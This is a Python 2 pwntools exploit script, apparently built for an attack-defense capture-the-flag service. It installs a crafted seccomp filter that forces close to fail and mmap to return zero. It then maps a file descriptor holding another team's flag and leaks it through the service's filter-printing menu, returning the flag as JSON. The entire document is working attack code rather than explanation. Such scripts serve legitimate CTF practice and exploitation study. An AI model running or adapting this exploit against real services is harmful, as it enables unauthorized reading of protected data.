#!/usr/bin/python2
import sys
import json
import traceback
ARGS = list(sys.argv)

from pwn import *

context.log_level = "CRITICAL"
#context.log_level = "DEBUG"

global r

# Exploit 1, we have to block close, mmap at a low address, make mmap return 0,

def randomString(n):
    s = ''.join(random.choice(string.letters + string.digits) for _ in range(n))
    return s


"""
struct sock_filter safe_filter[] = {
    {.code=0x4141, .jt=0x41, .jf=0x41, .k=0x42424242},
    EXAMINE_SYSCALL,
    SYSCALL_ERRNO(close, 0),
    ALLOW_OTHER_THAN_SYSCALL(mmap),
    EXAMINE_ARG_LOW(4),
    EQ_ERRNO(0, 123),
    ALLOW_REST,
    {.code=0x4141, .jt=0x41, .jf=0x41, .k=0x42424242},
};
"""

def add_filter(f):
    r.readuntil("> ")
    r.sendline("1")
    r.readuntil("filter? ")
    r.sendline(str(len(f)))
    r.readuntil("data? ")
    r.send(f)

def install():
    r.readuntil("> ")
    r.sendline("3")

def run_test(syscall, args):
    r.readuntil("> ")
    r.sendline("5")
    l = [syscall] + args
    assert len(l) == 7
    for i in range(len(l)):
        r.readuntil("arg" + str(i) + ") ")
        assert -0x8000 <= l[i] < 0x8000
        r.sendline(str(l[i]))
    r.readuntil("ult: ")
    res = int(r.readuntil("\n"), 10)
    #print "res", res
    return res

def bad_password_load(save_id):
    r.readuntil("> ")
    r.sendline("7")
    r.readuntil("loading\n")
    r.sendline(save_id)
    r.readuntil("password\n")
    r.sendline(randomString(7))
    assert "Invalid password\n" == r.readuntil("\n")
    
def compile_grab_filter():
    os.system("rm a.out; gcc compile_me_to_grab_filters.c")
    with open("a.out", "rb") as f:
        data = f.read()
    FILTER=data.split("AAAABBBB")[1]
    #print repr(FILTER)

def exploit(ip, port, flag_id):
    global r
    r = remote(ip, port)

    FILTER=' \x00\x00\x00\x00\x00\x00\x00\x15\x00\x00\x01\x03\x00\x00\x00\x06\x00\x00\x00\x00\x00\x05\x00\x15\x00\x00\x01\x0c\x00\x00\x00\x06\x00\x00\x00\x00\x00\x05\x00\x15\x00\x01\x00\t\x00\x00\x00\x06\x00\x00\x00\x00\x00\xff\x7f \x00\x00\x000\x00\x00\x00\x15\x00\x00\x01\xff\xff\xff\xff\x06\x00\x00\x00{\x00\x05\x00\x06\x00\x00\x00\x00\x00\xff\x7f'

    r.readuntil("What is your name?\n")
    r.sendline(randomString(0x18))

    # first install the filter and get our mmap
    add_filter(FILTER)

    # install
    install()

    # malloc 0
    r.readuntil("> ")
    r.sendline("1")
    r.readuntil("filter? ")
    r.sendline("262144")
    r.readuntil("data? ")
    r.sendline("AAA")
    r.readuntil("> ")

    # try loading to get fd 3
    bad_password_load(flag_id)

    # mmap 0x8000
    result = run_test(9, [0x7000, 0x1000, 0x7, 0x2, 0x3, 0x0])
    #print "result: ", result

    # read it from the filter
    r.readuntil("> ")
    r.sendline("4")
    r.readuntil("printing from? ")
    r.sendline("65536")
    r.readuntil("Filter: ")
    res = r.read(0x100, timeout=2)
    res = res.decode('hex')
    flag = res.split("\n")[1]
    #print "FLAG", flag
    return {
             'error': 0,
             'error_msg': "",
             'payload': {'flag': flag}
           }



if __name__ == "__main__":
    try:
        sys.argv = ARGS
        addr = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
        port = sys.argv[2] if len(sys.argv) > 2 else 6666
        assert len(sys.argv) > 3
        res = exploit(addr, port, sys.argv[3])
        print json.dumps(res)
    except Exception as e:
        response = {
            "error": 1,
            "error_msg": str(e)+traceback.format_exc(),
            "payload": {}
        }
        print json.dumps(response)

